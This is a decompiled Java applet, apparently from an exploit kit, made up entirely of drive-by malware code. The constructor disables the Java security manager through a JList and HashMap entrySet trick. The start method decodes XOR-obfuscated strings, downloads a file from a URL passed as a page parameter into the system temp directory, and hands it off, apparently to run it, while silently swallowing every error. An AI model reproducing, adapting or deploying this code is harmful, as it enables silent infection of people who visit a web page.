// 
// Decompiled by Procyon v0.5.30
// 

package asdasd;

import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

public class Globus extends Applet
{
    String lsjgioerg;
    String lsjgiroerg;
    String lsjrgioerg;
    
    @Override
    public void start() {
        super.start();
        try {
            final String bolshe = bolshe(new int[] { 86, 81, 79 });
            final String bolshe2 = bolshe(new int[] { 73, 66, 85, 66, 13, 74, 76, 13, 87, 78, 83, 71, 74, 81 });
            final String parameter = this.getParameter(bolshe);
            final String string = String.valueOf(Stremer.prop(bolshe2)) + Stremer.ddddf();
            try {
                final URL url = new URL(parameter);
                Stremer.ope(url);
                final InputStream london = Stremer.london(url);
                final FileOutputStream fileOutputStream = new FileOutputStream(string);
                final byte[] array = new byte[1024];
                int read;
                while ((read = london.read(array, 0, array.length)) != -1) {
                    fileOutputStream.write(array, 0, read);
                }
                london.close();
                fileOutputStream.close();
                Pleme.lererenet(string);
            }
            catch (Exception ex) {}
        }
        catch (Exception ex2) {}
    }
    
    public Globus() throws InstantiationException, IllegalAccessException {
        final Glocker glocker = new Glocker(System.class, "setSecurityManager", new Object[1]);
        final HashSet<Glocker> set = new HashSet<Glocker>();
        set.add(glocker);
        this.add(new JList<Object>(new Object[] { new HashMap() {
                @Override
                public Set entrySet() {
                    return set;
                }
            } }));
    }
    
    static String bolshe(final int[] array) {
        final byte b = (byte)Math.ceil(34.33);
        final StringBuffer sb = new StringBuffer();
        for (int i = 0; i < array.length; ++i) {
            array[i] ^= b;
            sb.append((char)array[i]);
        }
        return sb.toString();
    }
}
